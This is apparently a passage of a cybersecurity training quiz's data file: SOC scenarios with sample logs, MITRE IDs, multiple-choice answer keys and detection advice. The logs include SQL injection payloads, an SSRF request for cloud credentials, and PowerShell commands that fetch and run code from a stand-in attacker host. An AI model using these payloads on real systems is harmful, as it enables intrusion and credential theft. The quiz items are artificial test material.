+{id:"N9",title:"Encoded Data in URL Parameters",mitre:"T1041",diff:"Medium",
+scenario:"Proxy logs show repeated HTTP GET requests from one host to a newly-registered domain. The URL structure looks like a software update check — but the query parameters contain long strings that don't look like typical version or device IDs. The domain is one day old with privacy WHOIS. Decode the parameters and reconsider what's actually happening.",
+log:`<span class="hl-cyan">[Proxy Log]</span>
+10.0.7.10 → GET http://update.legit-looking.net/check?id=<span class="hl-red">aGVsbG8gd29ybGQ</span>&v=2.1
+10.0.7.10 → GET http://update.legit-looking.net/check?id=<span class="hl-red">dGhpcyBpcyBhIHNlY3JldA</span>&v=2.1
+10.0.7.10 → GET http://update.legit-looking.net/check?id=<span class="hl-red">ZmlsZSBjb250ZW50cyBoZXJl</span>&v=2.1
+
+Domain Age: <span class="hl-red">1 day old</span>  |  WHOIS: Privacy-protected`,
+hint1:"MITRE ATT&CK: T1041 — Exfiltration Over C2 Channel (HTTP GET parameter encoding)",
+options:["A software update client sending a unique installation ID to check for updates","Data being exfiltrated in Base64-encoded URI parameters, blending with legitimate update traffic","A browser sending telemetry to an analytics collection service","A CDN using session tokens in URL parameters for cache routing"],
+correct:1,
+explain:`<h4>Explanation</h4><p>The 'id' parameters are Base64-encoded data chunks being exfiltrated via HTTP GET — designed to blend with legitimate update check traffic. Decoded, they contain readable file content. A newly-registered domain with privacy WHOIS is a strong C2 infrastructure indicator. Legitimate software updates don't use one-day-old privacy-registered domains.</p><p><strong>Detect:</strong> High-entropy URI parameter values, domain age checks in proxy, Base64-decodable query strings containing readable content.</p>`},
+
+{id:"N10",title:"Corporate Host Connecting to Anonymizing Network",mitre:"T1090.003",diff:"Medium",
+scenario:"Firewall threat intel feeds match two outbound connections from an internal host to confirmed nodes in a well-known anonymizing network. The port on one connection matches the default relay port for that network. 847 MB of data transferred over 6 hours. A corporate endpoint should never communicate with these nodes. What does this indicate?",
+log:`<span class="hl-cyan">[Firewall Log]</span>
+10.0.8.55 → 185.220.101.47:<span class="hl-red">9001</span>  TCP Established
+10.0.8.55 → 185.220.101.33:443   TCP Established
+
+<span class="hl-cyan">[Threat Intel Match]</span>
+185.220.101.47 → <span class="hl-red">Known Tor Guard Node</span> (dan.me.uk/torlist)
+185.220.101.33 → <span class="hl-red">Known Tor Relay</span>
+
+Volume: <span class="hl-red">847 MB transferred over 6 hours</span>`,
+hint1:"MITRE ATT&CK: T1090.003 — Proxy: Multi-hop Proxy (Tor Network)",
+options:["A user running Tor Browser for legitimate privacy research","Malware routing C2 communications through Tor for anonymization — attacker infrastructure becomes untraceable","IT security testing network detection capabilities against Tor traffic","A privacy-focused VPN application routing through Tor relay infrastructure"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Tor-based C2 makes attacker infrastructure attribution nearly impossible — traffic bounces through multiple encrypted hops. Port 9001 is the Tor OR (onion router) default. 847 MB over 6 hours indicates substantial C2 activity or data transfer. Corporate endpoints should never communicate with Tor nodes. Malware families using Tor include TrickBot, Emotet variants, and REvil ransomware.</p><p><strong>Block:</strong> Maintain Tor node IP blocklists (dan.me.uk/torlist), block ports 9001/9050/9150/9150 outbound.</p>`},
+
+{id:"N11",title:"Kerberos Request With a Missing Required Field",mitre:"T1558.004",diff:"Hard",
+scenario:"You're reviewing Kerberos authentication traffic and notice a pattern: multiple AS-REQ packets for different user accounts, all missing a field that's supposed to be required by default. The DC is responding successfully to these requests — handing back encrypted blobs without the requester proving they know the password. Eight accounts targeted in 30 seconds. What's happening?",
+log:`<span class="hl-cyan">[Kerberos Traffic — Network Capture]</span>
+AS-REQ:
+  Client:  attacker_pc$
+  Options: <span class="hl-red">Pre-authentication NOT included</span>
+  CName:   <span class="hl-red">svc_reporting</span>
+
+AS-REP:
+  Status:  <span class="hl-green">KRB_AS_REP</span>
+  EncPart: <span class="hl-red">encrypted with svc_reporting's password hash (RC4)</span>
+
+<span class="hl-red">Repeated for 8 accounts in 30 seconds</span>`,
+hint1:"MITRE ATT&CK: T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting",
+options:["Normal Kerberos authentication for service accounts that don't require interactive logon","Exploiting accounts with pre-authentication disabled — collecting encrypted material for offline password cracking","A domain controller issuing tickets after a Group Policy refresh forced re-authentication","Windows SSO pre-obtaining Kerberos tickets for multiple services the user accesses"],
+correct:1,
+explain:`<h4>Explanation</h4><p>AS-REP Roasting targets accounts with 'Do Not Require Kerberos Pre-Authentication' enabled. Without pre-auth, the DC returns an AS-REP encrypted with the account's hash — no knowledge of the password required to request it. The attacker cracks the encrypted blob offline. Fix: enable pre-authentication on all accounts; audit for DoNotRequirePreAuth. Tools: Rubeus asreproast, Impacket GetNPUsers.</p><p><strong>Detect:</strong> EID 4768 without pre-auth, multiple AS-REQ without pre-auth from one source in a short window.</p>`},
+
+{id:"N12",title:"Two DHCP Servers on One Segment",mitre:"T1557",diff:"Medium",
+scenario:"A client workstation just received a DHCP lease — but it didn't come from your DHCP server. A second, unauthorized DHCP server answered first. The lease it provided lists its own IP as both the default gateway and the DNS server. What control does this give the unauthorized server over that workstation's traffic?",
+log:`<span class="hl-cyan">[DHCP Server Log]</span>
+Auth DHCP 10.0.0.1 → Client 10.0.9.100  OFFER
+<span class="hl-red">ROGUE DHCP 10.0.9.55</span> → Client 10.0.9.100  OFFER  (faster response, won)
+
+<span class="hl-cyan">[Lease from Rogue Server]</span>
+IP Assigned:     10.0.9.150
+Default Gateway: <span class="hl-red">10.0.9.55</span>  ← attacker's machine
+DNS Server:      <span class="hl-red">10.0.9.55</span>  ← attacker's DNS`,
+hint1:"MITRE ATT&CK: T1557 — Adversary-in-the-Middle (Rogue DHCP Server)",
+options:["A secondary DHCP server providing high-availability redundancy for the subnet","Rogue DHCP server: the attacker controls this client's default gateway and DNS — full traffic interception","A DHCP relay agent forwarding requests between network segments","A misconfigured router accidentally broadcasting DHCP responses"],
+correct:1,
+explain:`<h4>Explanation</h4><p>As gateway: all client traffic flows through the attacker's machine (full MITM). As DNS: the attacker controls name resolution and can redirect any domain to attacker-controlled IPs. Both together = complete traffic interception and credential harvesting opportunity. Prevention: DHCP Snooping on managed switches (only permit DHCP offers from trusted ports).</p><p><strong>Detect:</strong> Multiple DHCP servers on a segment, unauthorized DHCP offer alerts in network management.</p>`},
+
+{id:"N13",title:"Web Request With SQL Syntax in the URL",mitre:"T1190",diff:"Easy",
+scenario:"Your WAF logs show a web user who started with a simple product page request and then escalated to requests with obvious SQL syntax appended to URL parameters. The second suspicious request returned a significantly larger response than the first. Why does response size matter here?",
+log:`<span class="hl-cyan">[WAF / Web Proxy Log]</span>
+SrcIP:  203.0.113.200
+URL:    /products?id=<span class="hl-red">1' OR '1'='1</span>
+Status: 200 OK
+
+URL:    /products?id=<span class="hl-red">1' UNION SELECT username,password,3 FROM users--</span>
+Status: 200 OK
+BytesOut: <span class="hl-red">8,224</span>  (significantly larger than normal product response)`,
+hint1:"MITRE ATT&CK: T1190 — Exploit Public-Facing Application (SQL Injection)",
+options:["A user searching for products using special characters that happened to match SQL syntax","SQL injection: the UNION SELECT clause successfully appended database user credentials to the HTTP response","A web crawler sending malformed requests during automated indexing","A vulnerability scanner using non-invasive test payloads to check for issues"],
+correct:1,
+explain:`<h4>Explanation</h4><p>The first payload (' OR '1'='1) tests for injection — a 200 response confirms it. The UNION SELECT then appends results from the users table to the product query. The larger BytesOut value indicates the HTTP response now contains the username and password columns from the database. Prevention: parameterized queries (not input escaping).</p><p><strong>Detect:</strong> WAF SQLi alerts, response size anomalies across parameter variants, SQL keywords in URI parameters.</p>`},
+
+{id:"N14",title:"Workstation Sweeping for Remote Desktop",mitre:"T1018",diff:"Easy",
+scenario:"NetFlow data shows a single compromised workstation reaching out to 762 hosts across three internal subnets on the same port over a 5-minute window. Your threat intel notes this port is commonly used for graphical remote access to Windows machines. 14 hosts responded positively. What does the attacker do next with this information?",
+log:`<span class="hl-cyan">[NetFlow — 5 minute window]</span>
+Src: 10.1.1.200 → 10.1.2.0/24 (254 hosts) : 3389 TCP
+Src: 10.1.1.200 → 10.1.3.0/24 (254 hosts) : 3389 TCP
+Src: 10.1.1.200 → 10.1.4.0/24 (254 hosts) : 3389 TCP
+
+Total: <span class="hl-red">762 hosts contacted in 300 seconds on port 3389</span>
+Successful RDP responses: <span class="hl-green">14 hosts</span>
+
+Context: <span class="hl-red">10.1.1.200 = known compromised workstation</span>`,
+hint1:"MITRE ATT&CK: T1018 — Remote System Discovery (RDP Sweep for Lateral Movement)",
+options:["A helpdesk tool discovering which workstations have Remote Desktop enabled for support","A compromised host mapping RDP-accessible systems as the next lateral movement targets","Windows Remote Desktop Services probing for available session hosts","A network management tool inventorying hosts by available services"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Post-compromise discovery: the attacker is mapping RDP-accessible hosts from the beachhead. The 14 responding hosts are the shortlist for lateral movement via RDP credential attacks or Pass-the-Hash. Response: isolate 10.1.1.200 immediately; review subsequent logon events from it to any of the 14 responding hosts.</p><p><strong>Detect:</strong> Single internal source contacting >50 unique hosts on one port within 5 minutes.</p>`},
+
+{id:"N15",title:"Your IP Prefix Being Announced by Someone Else",mitre:"T1557",diff:"Hard",
+scenario:"A BGP monitoring service alerts your NOC: a portion of your organization's publicly-registered IP prefix is now being announced from an AS you don't own or control. The announcement is a more-specific prefix than yours — and about 40% of global internet traffic destined for your public services is now routing through a third-party AS. What is the impact?",
+log:`<span class="hl-cyan">[BGP Route Monitor]</span>
+Your prefix:   203.0.113.0/24  (AS 64500)
+Hijacked by:   AS <span class="hl-red">213100</span>  (more-specific: 203.0.113.0/<span class="hl-red">25</span>)
+Origin:        <span class="hl-red">AS 213100</span>  (unknown entity)
+
+Normal path:  AS64500 ← AS1299 ← AS3356
+Hijack path:  <span class="hl-red">AS213100</span> ← AS174 ← AS3356
+
+Impact: <span class="hl-red">~40% of global BGP peers routing your traffic through AS213100</span>`,
+hint1:"MITRE ATT&CK: T1557 — Adversary-in-the-Middle (BGP Route Hijacking)",
+options:["A legitimate ISP announcing a more-specific route for traffic engineering purposes","BGP route hijacking: a malicious AS is announcing your IP prefix and intercepting your internet traffic","MPLS provider configuring private BGP routes for a customer SLA","Anycast routing distributing inbound traffic to regional points of presence"],
+correct:1,
+explain:`<h4>Explanation</h4><p>BGP prefers more-specific routes — a /25 beats your /24. BGP has no native cryptographic verification, making it exploitable. 40% of your public traffic is now flowing through an unknown AS — enabling interception of emails, VPN connections, and any unencrypted services. Real-world example: the 2018 Amazon Route 53 BGP hijack. Mitigations: RPKI (Resource Public Key Infrastructure), BGP monitoring services, IRR filtering at transit providers.</p><p><strong>Prevention:</strong> Deploy RPKI Route Origin Authorization (ROA) records for all your prefixes.</p>`},
+
+{id:"N16",title:"Pings With Non-Standard Payloads",mitre:"T1095",diff:"Hard",
+scenario:"Your firewall permits outbound ICMP. You notice an endpoint sending a high rate of ICMP Echo Requests to an external IP. That's normal on its own — but when you inspect the packet payloads, they don't contain the predictable fixed-pattern data that standard ping utilities produce. The payload content is different in every packet. What might this traffic actually be?",
+log:`<span class="hl-cyan">[Firewall — ICMP Traffic]</span>
+10.0.10.44 → 8.8.8.8  Echo Req  Seq:1  Payload: <span class="hl-red">48 65 6c 6c 6f 20 57 6f 72 6c 64</span>
+10.0.10.44 → 8.8.8.8  Echo Req  Seq:2  Payload: <span class="hl-red">54 68 69 73 20 69 73 20 73 65 63</span>
+10.0.10.44 → 8.8.8.8  Echo Req  Seq:3  Payload: <span class="hl-red">72 65 74 20 64 61 74 61 20 62 65</span>
+
+Baseline: Normal ICMP payloads are zero-padded or use abcdefgh... pattern
+Tool match: <span class="hl-red">ptunnel-ng / icmptunnel signature</span>`,
+hint1:"MITRE ATT&CK: T1095 — Non-Application Layer Protocol (ICMP Covert Channel)",
+options:["A network admin pinging an external DNS server to test basic internet connectivity","Data being exfiltrated or a tunnel being established inside ICMP Echo Request payloads","Windows keepalive ICMP packets sent to test network reachability","A VPN client using ICMP for NAT traversal through a restrictive firewall"],
+correct:1,
+explain:`<h4>Explanation</h4><p>ICMP tunneling (ptunnel-ng, icmptunnel): tools embed arbitrary data in ICMP Echo Request/Reply payloads, creating a full IP tunnel that bypasses TCP/UDP firewalls. Hex-decoded: 'Hello World', 'This is sec', 'ret data be' — plaintext data fragments. Standard ping payloads use a fixed pattern (0x00 padding or 'abcdefgh...').</p><p><strong>Detect:</strong> ICMP deep packet inspection, alert on ICMP with printable ASCII or non-standard payload content, high ICMP rate to external IPs.</p>`},
+
+{id:"N17",title:"OAuth Code Redeemed From the Wrong IP",mitre:"T1528",diff:"Medium",
+scenario:"Your OAuth authorization server logs show an auth code being exchanged for an access token. The code was generated when a legitimate user authenticated — but the IP redeeming the code is in Eastern Europe via Tor, not the user's IP. The token was granted read and write access to all company resources. The user is currently at their desk in the US.",
+log:`<span class="hl-cyan">[Web Proxy Log]</span>
+SrcIP:    <span class="hl-red">91.108.4.77</span>  (Tor exit, Russia)
+URL:      https://app.corp.local/oauth/callback?<span class="hl-red">code=4a3b2c1d</span>
+Referrer: https://phishing-site.ru/redirect
+
+<span class="hl-cyan">[Auth Server]</span>
+Token issued:   jsmith@corp.local
+Scope:          <span class="hl-red">read:all write:all admin:org</span>
+Refresh expiry: <span class="hl-red">90 days</span>`,
+hint1:"MITRE ATT&CK: T1528 — Steal Application Access Token (OAuth Authorization Code Interception)",
+options:["A user logging into a work app remotely while traveling internationally","An OAuth authorization code stolen via a phishing redirect and redeemed from an attacker IP for persistent admin access","A mobile app completing an OAuth flow from cloud infrastructure","SSO completing an OAuth flow on behalf of a legitimate remote worker"],
+correct:1,
+explain:`<h4>Explanation</h4><p>OAuth authorization codes should only be redeemed by the same client that initiated the flow. This code was captured via a phishing redirect and redeemed from a Tor exit IP. The 90-day refresh token with admin:org scope now provides persistent admin access that survives password resets. Mitigations: PKCE (Proof Key for Code Exchange), short auth code lifetimes, IP binding, admin scope approval workflows.</p><p><strong>Detect:</strong> Auth code redeemed from a different IP than initiation, redemptions from Tor/VPN exits, new tokens with broad admin scopes.</p>`},
+
+{id:"N18",title:"Hundreds of Failed Logins, One Password",mitre:"T1110.003",diff:"Easy",
+scenario:"Azure AD Identity Protection fires alerts at 3AM: 847 unique accounts just received failed authentication attempts over 30 minutes, all from Eastern European IP addresses. Looking closer, the pattern isn't random — it appears a single common password is being tried against every account. 23 accounts authenticated successfully. Why doesn't this trigger account lockout policies?",
+log:`<span class="hl-cyan">[Azure AD Sign-In Logs — 3:00–3:30 AM]</span>
+EID 4625 failures: <span class="hl-red">847 unique accounts</span> targeted
+Password tried:    <span class="hl-red">Winter2024!</span>  (inferred from timing pattern)
+Source IPs:        Multiple Eastern European addresses
+Duration:          30 minutes
+
+Successful logins: <span class="hl-red">23 accounts</span>
+  6 of 23 had <span class="hl-red">no MFA enrolled</span>`,
+hint1:"MITRE ATT&CK: T1110.003 — Brute Force: Password Spraying",
+options:["Users forgetting their passwords and triggering failed login alerts","A single seasonal password tried against hundreds of accounts — staying under lockout thresholds per-account","Azure AD performing a health check on account password policy compliance","An SSO platform synchronizing credentials and generating authentication events"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Password spraying (1 password × many accounts) deliberately stays below the per-account lockout threshold (e.g., 5 attempts). Season-based passwords like Winter2024! exploit predictable corporate naming patterns. The 6 MFA-less successfully authenticated accounts are the immediate takeover risk. Detection requires per-source-IP failure counting — not per-account.</p><p><strong>Detect:</strong> >50 unique TargetUserName failures from one source IP in 10 minutes; seasonal password patterns.</p>`},
+
+{id:"N19",title:"Remote Shell From an Unexpected Parent",mitre:"T1021.006",diff:"Medium",
+scenario:"On three different internal servers in rapid succession, a command shell appeared — not spawned by an interactive user session, but by the Windows Remote Management provider process. The commands that ran inside those shells look like Active Directory reconnaissance. Someone is moving through your environment without touching the keyboard locally. What are they using?",
+log:`<span class="hl-cyan">[Firewall Log]</span>
+10.0.0.44 → 10.0.0.120:5985  TCP Established  (WinRM HTTP)
+10.0.0.44 → 10.0.0.121:5985  TCP Established
+10.0.0.44 → 10.0.0.122:5985  TCP Established
+
+<span class="hl-cyan">[Sysmon EID 1 on 10.0.0.120]</span>
+ParentImage: C:\\Windows\\System32\\wsmprovhost.exe
+Image:       C:\\Windows\\System32\\cmd.exe
+CommandLine: cmd.exe /c <span class="hl-red">net group "Domain Admins" /domain</span>`,
+hint1:"MITRE ATT&CK: T1021.006 — Remote Services: Windows Remote Management",
+options:["IT admin using PowerShell remoting to manage several servers simultaneously","An attacker using WinRM to move laterally through the environment and enumerate AD from multiple hosts","Windows Remote Management performing health checks on managed endpoints","SCCM using WinRM to push a configuration update to servers"],
+correct:1,
+explain:`<h4>Explanation</h4><p>WinRM lateral movement (T1021.006): PowerShell's Enter-PSSession/Invoke-Command over port 5985/5986. Unlike PsExec, no service installation occurs — quieter and harder to detect. wsmprovhost.exe spawning cmd.exe is the key detection signature. The 'net group Domain Admins' command reveals the attacker's next target: high-privilege accounts to compromise.</p><p><strong>Detect:</strong> 5985/5986 connections from workstations, wsmprovhost.exe spawning shells; restrict WinRM to jump hosts only.</p>`},
+
+{id:"N20",title:"Self-Signed Certificate for a Famous Domain",mitre:"T1573.002",diff:"Medium",
+scenario:"SSL inspection flags an HTTPS connection to an IP address claiming to represent a major Microsoft update domain. The certificate checks out by name — but it's self-signed, only one day old, and the IP has no relationship with Microsoft's published infrastructure. A threat intel feed also flags the TLS fingerprint. What does this traffic most likely represent?",
+log:`<span class="hl-cyan">[SSL Certificate Inspection]</span>
+Destination: 195.88.54.16:443
+Cert CN:     <span class="hl-red">windows-update.microsoft.com.update-service.net</span>
+Issuer:      <span class="hl-red">Self-signed</span>
+Age:         <span class="hl-red">1 day old</span>
+
+Real microsoft.com: DigiCert, HSTS preloaded, years old
+
+JA3: <span class="hl-red">Matches Mythic C2 Framework default fingerprint</span>`,
+hint1:"MITRE ATT&CK: T1573.002 — Encrypted Channel: Asymmetric Cryptography (Mythic C2 over HTTPS)",
+options:["A Microsoft update server using a self-signed certificate for internal distribution","Attacker C2 infrastructure with a Microsoft-spoofing certificate — detected by TLS fingerprint despite the HTTPS disguise","Burp Suite proxy intercepting Windows Update traffic for inspection","A CDN edge node serving Microsoft update content from a regional cache"],
+correct:1,
+explain:`<h4>Explanation</h4><p>C2 HTTPS infrastructure (T1573.002): the certificate CN mimics a Microsoft domain, but self-signed + 1-day-old + known Mythic C2 JA3 fingerprint exposes the deception. The long domain-like CN is social engineering for log reviewers who don't look past the hostname. JA3/JARM fingerprinting catches this even through HTTPS encryption.</p><p><strong>Detect:</strong> JA3/JARM threat intel feeds, self-signed cert alerts for external connections, cert age under 7 days, domain similarity scoring against known brands.</p>`},
+
+{id:"N21",title:"Internal URL Fetcher Reaching Reserved Space",mitre:"T1552.005",diff:"Hard",
+scenario:"A web application on your cloud infrastructure has a URL-fetching feature. Someone just submitted a request that caused the application's own server to make an HTTP request to an IP address in the 169.254.0.0/16 range — an address that no external client should be able to reach. The response came back with data that looks like cloud credentials.",
+log:`<span class="hl-cyan">[Web App Log]</span>
+SrcIP:  203.0.113.88
+URL:    /fetch?url=<span class="hl-red">http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role</span>
+Status: 200 OK
+
+Response body:
+{
+  "AccessKeyId":     "<span class="hl-red">ASIAXXX...</span>",
+  "SecretAccessKey": "<span class="hl-red">wJalrXUtn...</span>",
+  "Token":           "<span class="hl-red">AQoXnyc...</span>"
+}`,
+hint1:"MITRE ATT&CK: T1552.005 — Unsecured Credentials: Cloud Instance Metadata API (SSRF to IMDS)",
+options:["An AWS health check agent validating its IAM role credentials from the instance","SSRF exploitation: an attacker tricked the web server into fetching its own EC2 IAM credentials from the cloud metadata service","A monitoring tool checking EC2 instance metadata for configuration compliance","AWS Systems Manager retrieving instance credentials for an automation runbook"],
+correct:1,
+explain:`<h4>Explanation</h4><p>SSRF → IMDS (T1552.005, T1190): 169.254.169.254 is the AWS EC2 Instance Metadata Service — only reachable from within the EC2 instance itself. A URL-fetching feature tricked the server into requesting its own IAM credentials. With AccessKey + SecretKey + Token the attacker has full AWS API access with whatever permissions the EC2 role holds. Mitigations: enforce IMDSv2 (requires a PUT session token, blocking SSRF), validate/block internal IP ranges in URL-fetching inputs.</p><p><strong>Prevention:</strong> IMDSv2 enforcement; block 169.254.169.254 in app-level URL validation.</p>`},
+
+{id:"N22",title:"Script Downloaded Directly Into Memory",mitre:"T1059.001",diff:"Medium",
+scenario:"A workstation's PowerShell activity log shows code downloaded from a public code repository — but no file was written to disk. The download and execution happened in a single command. Your traditional AV had nothing to scan because nothing landed on the filesystem. How was this possible, and where CAN you detect it?",
+log:`<span class="hl-cyan">[Process Chain]</span>
+WINWORD.EXE → cmd.exe → powershell.exe -W Hidden -NoP -c
+<span class="hl-red">(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/attacker/repo/main/stage1.ps1')|IEX</span>
+
+<span class="hl-cyan">[Sysmon EID 3 – Network]</span>
+Image:  powershell.exe
+DstIP:  185.199.108.133:443  (raw.githubusercontent.com)`,
+hint1:"MITRE ATT&CK: T1059.001 — Command and Scripting Interpreter: PowerShell (Fileless via IEX)",
+options:["PowerShell downloading a legitimate admin script from a GitHub repository","Fileless code execution: a malicious script downloaded into memory and executed without touching disk — evading file-based AV","Windows Package Manager fetching a PowerShell module for installation","A developer testing a GitHub Actions workflow script locally"],
+correct:1,
+explain:`<h4>Explanation</h4><p>DownloadString + IEX (Invoke-Expression) never writes to disk — no file for AV to scan. GitHub raw is used for its excellent domain reputation, bypassing URL-based blocking. Detection method: PowerShell Script Block Logging (EID 4104) captures the full decoded script in memory regardless of encoding. AMSI also inspects the script before execution.</p><p><strong>Enable:</strong> PowerShell Script Block Logging (EID 4104), AMSI, constrained language mode.</p>`},
+
+{id:"N23",title:"3AM RDP Login From Overseas",mitre:"T1021.001",diff:"Easy",
+scenario:"At 2:30 AM your firewall logs show a successful RDP connection reaching an internal server directly from an IP in the Netherlands. Port 3389 is open to the internet on this host. The account used is the built-in local administrator, authenticated with NTLM rather than Kerberos. No on-call work is scheduled. What is the most likely explanation?",
+log:`<span class="hl-cyan">[Firewall Log]</span>
+SrcIP:   <span class="hl-red">185.234.218.33</span>  (Netherlands VPN exit)
+DstPort: 3389 (RDP)
+Action:  <span class="hl-red">ALLOW</span>  ← RDP exposed to internet
+
+<span class="hl-cyan">[Security EID 4624]</span>
+LogonType:   10 (RemoteInteractive/RDP)
+AccountName: <span class="hl-red">administrator</span>
+AuthPackage: <span class="hl-red">NTLM</span>
+Result:      <span class="hl-green">Success</span>
+Time:        02:30 AM`,
+hint1:"MITRE ATT&CK: T1021.001 — Remote Services: Remote Desktop Protocol",
+options:["A company administrator working remotely from a Netherlands office","Unauthorized RDP access via stolen or brute-forced credentials — internet-facing RDP is a top ransomware entry point","WinRM establishing a remote session for an automated scheduled task","Windows Remote Assistance initiated at the request of the user"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Internet-facing RDP is the #1 ransomware initial access vector. The built-in administrator account + NTLM authentication (weaker than Kerberos/NLA) + VPN exit IP + 2:30 AM = high-confidence unauthorized access. Compromised RDP credentials are sold on dark web markets. Prevention: RDP behind VPN + MFA, disable the built-in admin account, require Network Level Authentication, restrict source IPs at the firewall.</p><p><strong>Response:</strong> Block inbound 3389 from internet immediately; investigate all activity in this session.</p>`},
+
+{id:"N24",title:"Compromised Host Interrogating the Network",mitre:"T1047",diff:"Medium",
+scenario:"A host that was flagged as compromised yesterday is now sending DCOM traffic to 254 hosts across its local subnet. On hosts that respond, your endpoint sensor shows the WMI provider process spawning a command shell that runs system information commands. The compromised host is gathering data about its neighbors. Why, and what comes next?",
+log:`<span class="hl-cyan">[Firewall — Internal]</span>
+10.0.5.33 → 10.0.5.0/24 : 135 (WMI/DCOM)  — 254 hosts in 45 seconds
+
+<span class="hl-cyan">[Sysmon EID 1 on 10.0.5.80]</span>
+ParentImage: <span class="hl-red">C:\\Windows\\System32\\wbem\\WmiPrvSE.exe</span>
+Image:       C:\\Windows\\System32\\cmd.exe
+CommandLine: cmd.exe /c <span class="hl-red">systeminfo && tasklist && ipconfig /all</span>
+
+<span class="hl-cyan">[Context: 10.0.5.33 = compromised endpoint]</span>`,
+hint1:"MITRE ATT&CK: T1047 — Windows Management Instrumentation (Remote WMI Lateral Discovery)",
+options:["A network management agent performing routine host inventory via WMI","A compromised beachhead using WMI to remotely surveil neighboring hosts before pivoting to them","Windows Defender scanning network hosts for vulnerabilities","SCCM performing client inventory using WMI queries"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Post-compromise WMI lateral discovery: attacker uses the compromised beachhead to run discovery commands (systeminfo, tasklist, ipconfig) on neighboring hosts via WMI remote execution. Port 135 scan across /24 in 45 seconds = automated tool. The gathered data (OS version, running processes, network config) informs the next pivot. Response: isolate 10.0.5.33 immediately, check all hosts that accepted WMI connections for follow-on activity.</p><p><strong>MITRE:</strong> T1047, T1018. Response: Isolate beachhead, check lateral targets for subsequent malicious activity.</p>`},
+
+{id:"N25",title:"DNS TXT Record Delivering Commands",mitre:"T1071.004",diff:"Hard",
+scenario:"During a threat hunt, you notice a host querying for the TXT record of an external domain every 60 seconds like clockwork. You pull one of the TXT responses and find it contains what looks like a Base64-encoded command string prefixed with 'cmd:exec:'. No legitimate service in your environment uses TXT records for configuration. What is this mechanism?",
+log:`<span class="hl-cyan">[DNS Response Capture]</span>
+Query:    c2config.attacker-infra.net  TXT
+Response: <span class="hl-red">"cmd:exec:cABvAHcAZQByAHMAaABlAGwAbAAgAC0A..."</span>
+
+Decoded:  cmd:exec:<span class="hl-red">powershell -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString(...)"</span>
+
+Host querying: 10.0.3.44
+Interval:      <span class="hl-red">Every 60 seconds</span>`,
+hint1:"MITRE ATT&CK: T1071.004 — Application Layer Protocol: DNS (DNS TXT C2 Command Delivery)",
+options:["An email server polling for SPF record updates for spam validation","Malware using DNS TXT records as a command delivery channel — attacker updates the record to issue new instructions","A CDN delivering application configuration updates via DNS TXT records","Windows DNS cache checking TXT record metadata for policy enforcement"],
+correct:1,
+explain:`<h4>Explanation</h4><p>DNS TXT C2: the attacker updates a DNS TXT record with encoded commands; malware polls it every 60 seconds. All infected hosts receive new instructions simultaneously via a single DNS update — no direct C2 connection needed. DNS traffic is rarely inspected for content. Detection: Zeek dns.log answers field inspection, TXT responses with Base64 or command syntax, regular polling to the same domain.</p><p><strong>Detect:</strong> TXT record content inspection; alert on TXT responses over 100 chars from domains with no email infrastructure (no MX/SPF context).</p>`}
+];
+</script>
+<script>
+const triageQ=[
+{id:"T1",title:"The Sleeping Workstation",mitre:"T1055.012 / T1041",
+scenario:`It's 2:15 AM on a Tuesday. A workstation assigned to a marketing intern (who is on vacation this week) has just initiated a sustained outbound HTTPS connection to an IP in Eastern Europe. The process making the connection is svchost.exe — but this instance has no <code>-k</code> service group argument. The connection is actively uploading data.`,
+hint1:"Legitimate svchost.exe is ALWAYS spawned by services.exe with a -k flag. What does a svchost.exe with no -k flag and a non-services.exe parent indicate about its true nature?",
+hint2:"Pull Sysmon EID 7 (image loaded) for this svchost PID — are the loaded DLLs consistent with any known Windows service group? Check EID 8 (CreateRemoteThread) near the time this svchost launched.",
+options:["A Windows service waking up for scheduled maintenance","Process hollowing: malicious code injected into svchost.exe is actively exfiltrating data","An IT monitoring agent checking in with a cloud management console","Windows Update downloading patches via a background service"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>svchost without -k + non-services.exe parent + 2AM + vacation workstation + sustained upload = process hollowing (T1055.012) with active exfiltration (T1041). Actions: (1) Isolate workstation from network immediately; (2) Capture memory before shutdown; (3) Check persistence mechanisms; (4) Investigate how the machine was accessed while the intern was away.</p><p><strong>Priority: CRITICAL — active data exfiltration in progress.</strong></p>`},
+
+{id:"T2",title:"The Helpful IT Email",mitre:"T1566.001 / T1204.002",
+scenario:`Your email gateway flags a message sent to 8 finance employees appearing to come from IT Support (spoofed address), asking them to review a 'Q3 Security Report' attached as an Excel file (Q3_Security_Report.xlsm). Three employees have opened it. Your EDR shows EXCEL.EXE spawned cmd.exe on two of those machines within minutes of opening.`,
+hint1:"Check what cmd.exe did after EXCEL.EXE spawned it. What commands ran? Check outbound network connections from those two machines immediately after the file opened.",
+hint2:"Look for new scheduled tasks or registry Run keys created within 5 minutes of the Excel file opening. Also check for new files appearing in %APPDATA% or %TEMP% during that window.",
+options:["Excel running a legitimate macro to generate a pivot table report","A malicious .xlsm macro executing a backdoor payload on two machines","The email gateway flagging a false positive on an internal template","Excel auto-updating macro security settings upon file open"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>EXCEL.EXE → cmd.exe = malicious macro execution (T1566.001 + T1204.002). Two machines confirmed compromised. Actions: isolate both; check third machine; block sender domain + file hash; sandbox the xlsm; check what cmd.exe commands ran; notify the 5 employees who haven't opened it and remove from inbox.</p><p><strong>Priority: HIGH — 2 confirmed compromised endpoints.</strong></p>`},
+
+{id:"T3",title:"The Late Night AD Change",mitre:"T1098 / T1078",
+scenario:`Your SIEM alerts at 11:47 PM: a user account belonging to a recently terminated employee (offboarded 3 days ago) has been used to add a new account named 'svc_backup2' to the Domain Admins group. The activity came from an IT workstation. The terminated employee's account should have been disabled.`,
+hint1:"Was the terminated account actually disabled? Check AD. Which IT workstation was used, and who was logged into it at 11:47 PM?",
+hint2:"Check EID 4728 (member added to security-enabled global group). Was it the terminated employee's account or a different account that somehow obtained their credentials? When was svc_backup2 created?",
+options:["IT completing offboarding by creating a replacement service account","An attacker using terminated employee credentials to create a backdoor Domain Admin account","Windows automatically re-enabling an account after AD replication issue","Group Policy restoring default service accounts via baseline"],
+correct:1,
